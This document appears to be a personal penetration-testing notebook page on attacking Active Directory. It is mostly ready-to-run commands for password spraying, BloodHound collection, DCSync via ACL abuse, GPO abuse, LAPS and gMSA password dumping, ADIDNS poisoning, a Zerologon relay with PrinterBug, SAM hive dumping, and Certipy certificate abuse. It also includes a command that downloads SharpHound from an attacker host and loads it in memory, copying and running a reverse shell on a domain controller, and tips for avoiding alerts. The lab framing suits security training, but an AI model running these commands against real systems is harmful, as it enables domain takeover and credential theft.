# AD

{% code overflow="wrap" %}
```
https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse
https://wadcoms.github.io/
https://m365internals.com/
https://www.thehacker.recipes/
https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
https://en.hackndo.com/
https://zer1t0.gitlab.io/posts/attacking_ad/
```
{% endcode %}

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" %}

## List of Well known SIDs on local machines

```bash
S-1-0-0 Nobody
S-1-1-0 Everybody
S-1-5-11 Authenticated Users
S-1-5-18 Local System
S-1-5-domainidentifier-500 Administrator

# Computer accounts can be used for:
Authenticate to the domain
RBCD attacks (silver tickets)
```

## Practice Examples

<pre data-overflow="wrap"><code>To simulate a full-attack chain:
1 - Exploit a vulnerability in the web application to get initial foothold onto machine01
2 - Retrieve cached passwords, crack hashes and login to client01 with such credentials
3 - Being a Domain User, kerberoast accounts, crack those hashes with rockyou.txt and log in with new account w/ RDP/psexec.py
4 - If our account has admin rights, get cached passwords / SAM then perform Overpass The Hash and use PsExec to get the DC

1 - Check the computer/IP with web server ports, if we can submit URLs try RFI/SSRF/Client-side attacks (HTA)
2 - If we have Medium Mandatory Level, try to escalate to High Integrity bypassing UAC fodhelper (works if Always Notify is off)
3 - Once you are admin, dump cached passwords with Mimikatz and reuse credentials to move to another computer/IP
4.a - If you find Apache running as LocalSystem and folder is writable, write a shell and trigger it on the webserver
4.b - Look for Unquoted Paths and if we are able to reboot the machine to trigger our malicious executable
5 - Dump SAM hashes to be able to log in as Administrator
6 - Find domain admins / service accounts and possible hashes/passwords to get into the DC

<strong>1 - Machine with webserver, we exploit web vulnerability and get SYSTEM privileges
</strong>2 - Export Kerberos tickets w/ Mimikatz and crack password for SPN MSSQL
3 - Use that password for the user that seems related to SQL and might be a service account
4 - Dump LSASS credentials with that SQL user and password
5 - Use those other creds to dump LSASS credentials again and get other set of creds that belong to a Domain Admin username
6 - With those creds we log in on the DC as that Domain Admin
</code></pre>

## Precompiled Binaries

[https://github.com/jakobfriedl/precompiled-binaries](https://github.com/jakobfriedl/precompiled-binaries)

## Traditional approach

```bash
# Local accounts
net user
# Entire domain
net user /domain
net user $USER /domain
# NOTE SUFFIXES ON USERS AND CUSTOM GROUPS
net group /domain
NOTE: A GROUP (AND ALL INCLUDED MEMGERS) CAN BE ADDED AS MEMBER OF ANOTHER (NESTED)

# Domain enumeration
windapsearch.py
```

## Attack Privilege Requirements

* Kerbrute Enumeration - No domain access required&#x20;
* Pass the Ticket - Access as a user to the domain required
* Kerberoasting - Access as any user required
* AS-REP Roasting - Access as any user required
* Golden Ticket - Full domain compromise (domain admin) required&#x20;
* Silver Ticket - Service hash required&#x20;
* Skeleton Key - Full domain compromise (domain admin) required

## Enumeration with Kerbrute

[#kerbrute](../../../enumeration/ports/88-kerberos.md#kerbrute "mention")

## Rubeus

Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.

Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.

We cover just the most crucial attacks -  its whole host of attacks and features here - [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

### Brute-Force/Password-Spray

Obtain Rubeus executable here: [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command:&#x20;

{% code overflow="wrap" %}
```bash
echo 10.10.120.125 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts

Rubeus.exe brute /password:Password1 /noticket # This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user 
```
{% endcode %}

## Kerberos - Roasting, tickets...

[#kerberos-attacks](../../../enumeration/ports/88-kerberos.md#kerberos-attacks "mention")

## Password Spraying / Password Policies

{% code overflow="wrap" fullWidth="true" %}
```
https://excellium-services.com/2024/02/08/the-art-of-password-spraying-a-comprehensive-analysis/
https://github.com/TheProtyro/Get-FineGrainedPasswordPolicy
https://github.com/TheProtyro/PasswordSpraying

If the “Domain Password Complex” is enabled, passwords must meet the following minimum requirements:
    Must not contain the user’s account name or parts of the user’s full name that exceed two consecutive characters.
    Must be at least six characters in length.
    Must contain characters from three of the following categories:
        English uppercase characters (A through Z).
        English lowercase characters (a through z).
        Base 10 digits (0 through 9).
        Nonalphanumeric characters (for example, !, $, #, %).

Guessable passwords may include:
    The company name
    The main business job of the company
    The location
    The area code
    The country
    The bordering countries of the country
    The current year, the next year and the previous years
    The seasons, recommended if the password policy requires a password change every three month.
    The months, recommended if the password policy requires a password change every month or even .
    Additional keywords related to the company.
```
{% endcode %}

## BloodHound / SharpHound

{% hint style="info" %}
DISABLE EDGES SUCH AS CanRDP OR PSRemote, THEY ARE USELESS AND MISLEAD 99 % TIMES THE REAL AD PATH TO ATTACK
{% endhint %}

{% hint style="info" %}
Important to use Raw Query&#x20;
{% endhint %}

[https://discord.com/channels/780824470113615893/1256940312421466203/1256940312421466203](https://discord.com/channels/780824470113615893/1256940312421466203/1256940312421466203)

{% hint style="info" %}
One of the most powerful features of BloodHound is its ability to find attack paths between two given nodes, if an attack path exists. Within the search bar is the “**pathfinding**” button, which brings down a second text box where you can type in the name of a node you want to target.
{% endhint %}

<pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash">https://github.com/Flangvik/SharpCollection
https://bloodhound.readthedocs.io/
<strong>https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html
</strong>https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux
https://bloodhound.readthedocs.io/en/latest/data-analysis/bloodhound-gui.html#
https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html
https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1

# ExcludeDCs -This will instruct Sharphound not to touch domain controllers, which reduces the likelihood that the Sharphound run will raise an alert.
.\Sharphound.exe -d (sub.)domain.local -c all --zipfilename bh_domain_local.zip
Sharphound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
neo4j console start
bloodhound --no-sandbox
https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html
# Session Data only -> new logins and logouts on AD -> execute Sharphound at first with "All" and then twice a day using the "Session" collection method. Best times awhen users come back to work in the mornings and afternoons.

# ON KALI, DUMP INFO REMOTELY WITH BLOODHOUND-PYTHON
bloodhound-python -d htb.local -u svc-alfonsio -p s3rv1ce -c all -ns 10.10.10.10
bloodhound.py --zip -c All -d domain.local -u $USER@sub.domain.local -p $PASS -dc dc.domain.local
# ANOTHER OPTION IS LOCALLY WITH SHARPHOUND
# Tranfer SharpHound.ps1 to the victim machine. Then:
PS > Import-Module .\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -ZipFileName bh.zip    
# TRANSFER THE .ZIP FOLDER TO YOUR ATTACKER MACHINE (USE SCP OR EVIL-WINRM)
*Evil-WinRM* PS C:\> download 20210109143954_BloodHound.zip /tmp/bloodhound.zip
<strong>
</strong># Sharphound Reflection in PS (full it in memory) (if Defender enabled you need first AMSI bypass)
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1/SharpHound.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Sharphound.Program]::Main("-d north.sevenkingdoms.local -c all".Split())
</code></pre>

{% tabs %}
{% tab title="Install" %}
I’ll clone the repository into `/opt`, and also got the latest release binary. I’ll start `neo4j` (`apt install neo4j` if it’s not already installed) with `neo4j start`, and then run Bloodhound. If you’re running as root, you’ll need the `--no-sandbox` flag.

If it’s a fresh install (or if you forget your password from a previous install, you can delete `/usr/share/neo4j/data/dbms/auth` and then it’s like a fresh install), I’ll need to change the `neo4j` password by running `neo4j console`, visiting the url it returns, and logging in with the default creds, neo4j/neo4j. It’ll force a password change them at that point. Now the BloodHound program can connect, thought first I need data.
{% endtab %}

{% tab title="Tips" %}
\- Check groups of a user (**Unrolled Group Membership** under Node Info). See if there is a diamond on any of them since that means it is a high value target. Research privesc ways for that group.

\- Knowing that group, now check **Analysis > Shortest Paths to High Value Targets** and see from that group to DC if possible

\- If possible, and for testing purposes, try to create a new user to change stuff, add it to groups and so on

\- Check **Outbound Object Control**
{% endtab %}

{% tab title="Queries" %}
{% code overflow="wrap" %}
```bash
https://en.hackndo.com/bloodhound/
https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
https://github.com/xenoscr/Useful-BloodHound-Queries/blob/master/List-Queries.md
https://gist.github.com/seajaysec/a4d4a545047a51053d52cba567f78a9b
https://infinitelogins.com/2022/01/28/bloodhound-cheatsheet-custom-queries-neo4j-lookups/

# Type it on Raw Query (at the bottom of the GUI)
# Show all domains and computers
MATCH p = (d:Domain)-[r:Contains*1..]->(n:Computer) RETURN p
# Show all users
MATCH p = (d:Domain)-[r:Contains*1..]->(n:User) RETURN p
# Overall map of domain/groups/users
MATCH q=(d:Domain)-[r:Contains*1..]->(n:Group)<-[s:MemberOf]-(u:User) RETURN q
# Users ACL
MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' RETURN p
MATCH (m:Computer) RETURN m # all computers
MATCH (m:User) RETURN m # all users
# (NODES)-[:RELATIONSHIP]->(NODES)
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p # all active sessions -> it means with admin privs we could dump hashes of that user logged inn
```
{% endcode %}
{% endtab %}

{% tab title="Mapping" %}
<pre class="language-bash"><code class="lang-bash">bloodhound --no-sandbox
<strong>sudo neo4j start
</strong>#Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:??
#Then log in on BloodHound
</code></pre>

{% hint style="info" %}
Better to export info as .zip and upload that .zip
{% endhint %}

![](<../../../.gitbook/assets/image (97).png>)

3.) Inside of Bloodhound search for this icon ![](https://i.imgur.com/rXgtiuK.png) and import the loot.zip folder

{% hint style="info" %}
On some versions of BloodHound the Import button does not work to get around this simply drag and drop the loot.zip folder into Bloodhound to import the .json files.
{% endhint %}

4.) To view the graphed network open the menu and select queries this will give you a list of pre-compiled queries to choose from.

![](<../../../.gitbook/assets/image (50).png>)

The queries can be as simple as find all domain admins -

![](<../../../.gitbook/assets/image (110).png>)

Or as complicated as shortest path to high value targets -

![](<../../../.gitbook/assets/image (111).png>)

There are plenty of queries to choose from and enumerate connections inside of the network.

[https://wald0.com/?p=112](https://wald0.com/?p=112)

[https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/](https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/)
{% endtab %}
{% endtabs %}

## DACL/GPO

{% content-ref url="acl.md" %}
[acl.md](acl.md)
{% endcontent-ref %}

### GenericAll

{% code overflow="wrap" %}
```bash
# First, create a new user (net user $USER $PASS /add)
net user antz hackthebox /add
# Add user to a specific group (net group "$GROUP_NAME" $USER /add)
net group "Exchange Windows Permissions" antz /add

# If we have GenericAll DACL over an account, we can modify any atribute such as UF_DONT_REQUIRE_PREAUTH or even enable the account w/ bloodyAD.
```
{% endcode %}

### WriteDACL

{% code overflow="wrap" fullWidth="true" %}
```bash
# To get DCSync rights on a user, first we need to authenticate:
$SecPassword = ConvertTo-SecureString 'hacktheboxpass' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\antz', $SecPassword)
# NOTE: htb\antz is the result of whoami command and hacktheboxpass is user's pass

Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity antz -Rights DCSync
# NOTE: htb.local is the domain

# Then we can use secretsdump.py to dump the hashes.
```
{% endcode %}

### Generic Write

{% code overflow="wrap" fullWidth="true" %}
```powershell
https://github.com/byronkg/SharpGPOAbuse
PS C:\> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount enterprise-security --GPOName SECURITY-POL-VN
PS C:\> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author $HOSTNAME??\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators $MYUSER /add" --GPOName "Vulnerable GPO"
# To not wait for the GPO refresh cycle
gpupdate /force
```
{% endcode %}

### DCSync

{% code overflow="wrap" fullWidth="true" %}
```bash
# Import PowerView.ps1
PS> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity $username -Rights DCSync
# After this, we can dump hashes with secretsdump for example
secretsdump.py domain.com/user:password@10.10.10.1
```
{% endcode %}

### bloodyAD

{% code overflow="wrap" fullWidth="true" %}
```sh
https://github.com/CravateRouge/bloodyAD/wiki/User-Guide

# ReadGMSAPassword
python /opt/Hacking/WINDOWS/AD/bloodyAD/bloodyAD.py -d vintage.htb -u "fs01$" -p fs01 -k --host dc01.vintage.htb  get object "gMSA01$" --attr msDS-ManagedPassword

# Add account to a group
python /opt/Hacking/WINDOWS/AD/bloodyAD/bloodyAD.py -d vintage.htb -u "gMSA01$" -k ccache=gMSA01$.ccache --host dc01.vintage.htb add groupMember "ServiceManagers" "gMSA01$"        

# Enable account
python /opt/Hacking/WINDOWS/AD/bloodyAD/bloodyAD.py -d vintage.htb -k --host dc01.vintage.htb remove uac svc_sql -f ACCOUNTDISABLE  

# Set UF_DONT_REQUIRE_PREAUTH to allow Kerberoasting
python /opt/Hacking/WINDOWS/AD/bloodyAD/bloodyAD.py -d vintage.htb -k --host dc01.vintage.htb add uac svc_sql -f DONT_REQ_PREAUTH 
```
{% endcode %}

### Targeted Kerberoast

If we have rights to do so, try AS-REP Roasting or Kerberoasting as well.

## LAPS

The **"Local Administrator Password Solution"** (LAPS) provides management of local account passwords of domain joined computers.&#x20;

Passwords are stored in Active Directory (AD) and protected by ACL, so only eligible users can read it or request its reset.&#x20;

LAPS is a tool that periodically changes the local administrator's password when it expires. It then stores the password details in the Active Directory.

{% code overflow="wrap" fullWidth="true" %}
```bash
nxc ldap -u $USER -p $PASS --laps
# NOTE: pay attention since you will see a red color like LOGON_FAILURE but precisely those are the credentials dumped

ldapsearch -v -x -H ldap://$IP -D 'domain\user' -w 'password' -b 'dc=domain,dc=com' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
# in case that user can dump LAPS password, it will
cme smb $IP -u $user -p $PASS --laps 

https://www.hackingarticles.in/credential-dumpinglaps/
https://github.com/leoloobeek/LAPSToolkit
https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/laps
# Find if there is a stored password with https://github.com/kfosaaen/Get-LAPSPasswords
PS> Get-LAPSPasswords
# Now we can provide valid credentials and see if we can retrieve the password
PS > $pw = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force                                                                                                     
PS > $creds = New-Object System.Management.Automation.PSCredential ("USER", $pw)                                                                                             
PS > Get-LAPSPasswords -DomainController $IP -Credential $creds
# for $pw and $creds use single quotes instead of ", note to change quotes in case it does not work

# ALTERNATIVE IF WE FIND PASSWORDS / Check which computers/groups/users can read the passwords
# https://github.com/leoloobeek/LAPSToolkit
Import-Module .\LAPSToolkit.ps1                                                                                                                                              
Get-LAPSComputers                                                                                                                                                            
Find-LAPSDelegatedGroups                                                                                                                                                     
Find-AdmPwdExtendedRights                                                                                                                                                    
# Read the passwords using valid credentials with https://github.com/swisskyrepo/SharpLAPS/releases
C:\> SharpLAPS.exe /user:WORKGROUP\user /pass:password /host:$IP
```
{% endcode %}

## GMSA (Group Managed Service Account)

[https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword#readgmsapassword](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword#readgmsapassword)

[https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe](https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe)

{% code overflow="wrap" fullWidth="true" %}
```powershell
Get-ADServiceAccount -Identity $USER -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword
Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'

bloodyAD.py --host $DC_IP -d "domain.local" -u $USER -p $PASS get object $TARGET_OBJECT_OR_USER --attr msDS-ManagedPassword
```
{% endcode %}

## ADIDNS poisoning

{% code overflow="wrap" fullWidth="true" %}
```bash
# If we Google about DNS Active Directory attacks, we find Active Directory Integrated DNS (ADIDNS) poisoning
https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing

# And there a Linux tool called dnstools.py
https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
# Query DNS record
└─$ python3 /opt/WINDOWS/AD/krbrelayx/dnstool.py -u 'domain.com\user' -p 'passw' --record '*' --action query -dc-ip 10.10.10.10 10.10.10.10
# add a node and attach a record
dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController

└─$ python3 /opt/WINDOWS/AD/krbrelayx/dnstool.py -u 'domain.com\user' -p 'passw' --record 'webantz' --action add --data $ATTACKER_IP $TARGET_IP             
# To check it was sucessful, we try again and see an error since it already exists
└─$ python3 /opt/WINDOWS/AD/krbrelayx/dnstool.py -u 'domain.com\user' -p 'passw' --record 'webantz' --action add --data 10.10.14.7 10.10.10.10
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[!] Record already exists and points to 10.10.14.7. Use --action modify to overwrite or --allow-multiple to override this
# Another way to test it was successfully added
nslookup
> server $IP
> webserver # if it points to our server address (target) it is ok, otherwise it says server can't find that DNS record

# Similar aproach
https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-http-image-and-internal-dns
# Now we use Responder to catch NTLMv2 hashes (for example)
sudo responder -I tun0
```
{% endcode %}

## Zerologon

{% code overflow="wrap" fullWidth="true" %}
```bash
# Only check
crackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon

# ANOTHER METHOD THAT INVOLVES RELAY
https://dirkjanm.io/a-different-way-of-abusing-zerologon/
Prerequisites:
  • An account is needed to trigger the printer bug (you can also use a POC in .NET that uses SSO if you have access to a Domain Joined box)
  • The Print Spooler service should be running on the DC 
└─$ impacket-rpcdump @VULNERABLE_DC_IP | egrep 'MS-RPRN|MS-PAR'           
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
  • The DC should be vulnerable to Zerologon
  • The DC should be able to connect to the attacker workstation and not be blocked by firewalls
  • You should be able to run Python and bind to port 445 for an incoming SMB connection (this is tricky on Windows) // I AM USING LINUX, NO PROBLEM
  • There should be at least 2 DCs in the domain, since relaying back to the same DC does not work // INDEED THERE IS ANOTHER DC (SRV01) WITH DOMAIN LAB.OFFSHORE.LOCAL
  
To exploit it given that the prerequisites are met, you can set up ntlmrelayx in DCSYNC relay mode and target DC1, while triggering the printer bug on DC2:

We can change roles in case it fails, but the right way to do it is PrinterBug on the other DC and the relay to the DC vulnerable to Zerologon.

Set up relay in DCSYNC relay mode and target the vulnerable DC (DC):


└─$ impacket-ntlmrelayx -t DCSYNC://dc.dom.local -smb2support                                                                                                      
...
[*] Multirelay disabled

[*] Servers started, waiting for connections


PrinterBug on the other DC (TEST) having valid creds on that DC and being the last IP my attacking host:


└─$ python /opt/Hacking/WINDOWS/AD/krbrelayx/printerbug.py dom.local/user:'Pass1234!'@TEST 10.10.14.5                                                               
[*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                                                                                                    
                                                                                                                                                                             
[*] Attempting to trigger authentication via rprn RPC at SRV01                                                                                                               
[*] Bind OK                                                                                                                                                                  
[*] Got handle                                                                                                                                                               
RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid.                                                                                    
[*] Triggered RPC backconnect, this may or may not have worked 
```
{% endcode %}

## Privileged groups

{% code overflow="wrap" fullWidth="true" %}
```bash
# Privileged Groups
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges
https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/

# Server Operators
https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators
https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/

# Account Operators
https://www.whiteoaksecurity.com/blog/account-operators-privilege-escalation/

# Backup Operators
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#a-d-attack
https://pentestlab.blog/tag/ntds-dit/
IMPORTANT: Include space or X after the last character of each line (diskshadow deletes last char of each line when we execute script to execute on diskshadow /s script.txt)

# SeBackup/SeRestore
https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/
https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md
# EASIER WAY, TRY ON DC AS WELL BEFORE USING THOSE MORE COMPLICATED METHODS TO DUMP NTDS.DIT
mkdir C:\temp
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
# SeBackupPrivilege -> best method is Exploiting Privilege on Domain Controller (Method 1) from 
https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/

# DnsAdmins
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
# To avoid crashing DNS service, check Ippsec video 
https://youtu.be/8KJebvmd1Fk?t=3163

# Azure Admins / Azure AD Sync/Connect
https://blog.xpnsec.com/azuread-connect-for-redteam/
https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/
https://github.com/fox-it/adconnectdump
```
{% endcode %}

### WSUS

{% code overflow="wrap" fullWidth="true" %}
```sh
# Check prerequisites here https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
https://medium.com/@iamkumarraj/a-deep-dive-into-wsus-security-risks-90578c89ddd9
https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/wsus
https://labs.nettitude.com/blog/introducing-sharpwsus/
https://github.com/nettitude/SharpWSUS
```
{% endcode %}

## Exploiting the DC

{% code overflow="wrap" %}
```bash
# FIND THE HOSTNAME
nslookup
> set type=all
> _ldap._tcp.dc._msdcs.sandbox.local # hostname --> first word of the line with IP
> exit

# OPEN A NEW SESSION AGAINST A REMOTE HOST
PS > $dcsess = New-PSSession -Computer $HOSTNAME
# Execute ipconfig for example to check we can execute commands
PS > Invoke-Command -Session $dcsess -ScriptBlock {ipconfig} 
# Transfer the embedded revshell (whoami.exe) to the DC
PS > Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsess
# Execute the revshell
PS > Invoke-Command -Session $dcsess -ScriptBlock {C:\Users\Public\whoami.exe}
```
{% endcode %}

## Domain Password Spray script

{% embed url="https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1" %}

## AD CS - Certificate Services



{% code overflow="wrap" fullWidth="true" %}
```sh
https://github.com/ly4k/Certipy
# Create a machine account
certipy account create -u username@domain -p password -user <Account Name> -dns <dNSHostName> [-dc-ip <DC IP>]
# Request a new certificate
certipy req -u username@domain -p password -ca <CA Name> -template Machine
# Authentication to receive the certificate file
certipy auth -pfx dc.pfx -dc-ip <DC IP>
# The NT Hash of the dc$ computer object is returned
# Finally, DCSync attack
secretsdump 'domain/DC$dc.domain' -hashes :<NT Hash>

# Certipy implements more domain escalation techniques
https://github.com/ly4k/Certipy#domain-escalation

# Mitigating CVE-2022-26923
The May 2022 Security Update https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923 for Windows systems includes a patch
This effectively prevents the basic attack described above, where a new machine is added to the domain by an unprivileged user, which automatically inherits “Validated write to DNS host name” rights to the account. However, a user with higher privileges (like GenericWrite) on any machine account would still be able to add a custom dNSHostName value.
```
{% endcode %}

## Vulnerability Scanner

[https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn)

## Tools

```
https://github.com/logangoins/Cable/
```

## Resources

| [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md) |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [https://www.puckiestyle.nl/top-16-active-directory-vulnerabilities/](https://www.puckiestyle.nl/top-16-active-directory-vulnerabilities/)                                                                                                                   |
| [https://www.puckiestyle.nl/domain-attacks/](https://www.puckiestyle.nl/domain-attacks/)                                                                                                                                                                     |

* [https://www.harmj0y.net/blog/](https://www.harmj0y.net/blog/)
* [https://adsecurity.org/](https://adsecurity.org/)
* [https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
* [https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)
* [https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
* [https://www.varonis.com/blog/kerberos-authentication-explained/](https://www.varonis.com/blog/kerberos-authentication-explained/)
* [https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)
* [https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf)
* [https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf](https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf)
